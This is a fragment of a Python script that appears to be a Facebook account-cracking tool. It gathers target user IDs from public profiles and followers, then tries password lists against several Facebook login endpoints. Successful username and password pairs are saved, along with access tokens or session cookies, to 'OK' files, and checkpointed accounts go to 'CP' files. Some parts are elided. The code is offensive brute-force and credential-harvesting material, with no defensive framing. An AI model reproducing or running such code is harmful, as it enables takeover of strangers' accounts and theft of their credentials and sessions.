...
def menu():
	...
	if Bilal =="":
		...
		print("\n\033[1;92m[\033[1;92m01\033[1;92m] CHECK CRACK RESULTS OK")
		print("\033[1;92m[\033[1;92m02\033[1;92m] CHECK RESULTS CP")
		cek = raw_input("\n\033[1;92m[\033[1;92m+\033[1;92m] CHOOSE : ")
		if cek =="":
			menu()
		elif cek == "1":
			dirs = os.listdir("OK")
...
def publik():
	...
	idt = raw_input("\n\033[1;92m[\033[1;92m+\033[1;92m] Target Id: ")
	try:
	...
	print("\033[1;92m[\033[1;92m+\033[1;92m] Total id  : \033[0;91m%s\033[0;97m"%(len(id))) 
...
def follower():
	...
	idt = raw_input("\n\033[1;96m[\033[1;92m+\033[1;92m] TARGET ID : ")
	try:
...
def massal():
	...
	print("\033[1;96m[\033[1;92m?\033[1;92m] Total id  : \033[0;92m%s\033[0;96m"%(len(id)))

def method():
	print("\n\033[1;92m[\033[1;92m?\033[1;92m] CHOOSE CRACKING METHOD")
	print("\033[1;92m[\033[1;92m1\033[1;92m] B-API\033[1;97m [ \033[1;92mHAM PRO/FASTER \033[1;92m]")
	print("\033[1;92m[\033[1;92m2\033[1;92m] MBASIC\033[1;92m [ \033[1;92mFAST \033[1;92m]")
	print("\033[1;92m[\033[1;92m3\033[1;92m] FREE FACEBOOK\033[1;92m [ \033[1;92mNORMAL\033[1;92m]")
	method = raw_input("\033[1;92m[\033[1;92m?\033[1;92m] CHOOSE : ")
	if method == "":
		menu()
	elif method == "1":
		ask = raw_input("\033[1;92m[\033[1;92m!\033[1;92m] DO YOU CHOOSE MANUAL PASSWORD y/t\033[1;92m [ \033[1;92mDefault : t \033[1;92m] : ")
		if ask == "y":
			manual()
		print(" ")
		...
		ask = raw_input("\033[1;92m[\033[1;92m03\033[1;92m] DO YOU CHOOSE MANUAL PASSWORD y/t\033[1;92m [ \033[1;92mDefault : t \033[1;92m] ")
		if ask == "y":
			manual()
		print(" ")
...
def cek_ttl_cp(uid, pw):
	try:
		...
		with requests.Session() as ses:
			...
			print("\r\033[0;95m[CHECKPOINT] %s|%s|%s %s %s\033[0;91m"%(uid, pw, day, month, year))
	...
	try:
		for pw in pwx:
			...
			if "session_key" in send.text and "EAAA" in send.text:
				print("\r\033[0;94m[JUSTNOW-OK] %s|%s|%s\033[0;97m"%(uid, pw, send.json()["access_token"]))
				ok.append("%s|%s"%(uid, pw))
				open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue
			elif "www.facebook.com" in send.json()["error_msg"]:
				print("\r\033[0;95m[CHECKPOINT] %s|%s\033[0;92m        "%(uid, pw))
				cp.append("%s|%s"%(uid, pw))
	...
	try:
		for pw in pwx:
			...
			if "c_user" in ses.cookies.get_dict().keys():
				...
				print("\r\033[0;94m[JUSTNOW-OK] %s|%s|%s\033[0;95m"%(uid, pw, kuki))
				ok.append("%s|%s"%(uid, pw))
				open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue
			elif "checkpoint" in ses.cookies.get_dict().keys():
				print("\r\033[0;95m[CHECKPOINT] %s|%s\033[0;96m        "%(uid, pw))
				cp.append("%s|%s"%(uid, pw))
				open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue
...
def mobile(user):
	...
	try:
		for pw in pwx:
			...
			if "c_user" in ses.cookies.get_dict().keys():
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print("\r\033[0;94m[JUSTNOW-OK] %s|%s|%s\033[0;97m"%(uid, pw, kuki))
				ok.append("%s|%s"%(uid, pw))
				open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue
			elif "checkpoint" in ses.cookies.get_dict().keys():
				print("\r\033[0;95m[CHECKPOINT] %s|%s\033[0;91m        "%(uid, pw))
				cp.append("%s|%s"%(uid, pw))
				open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue
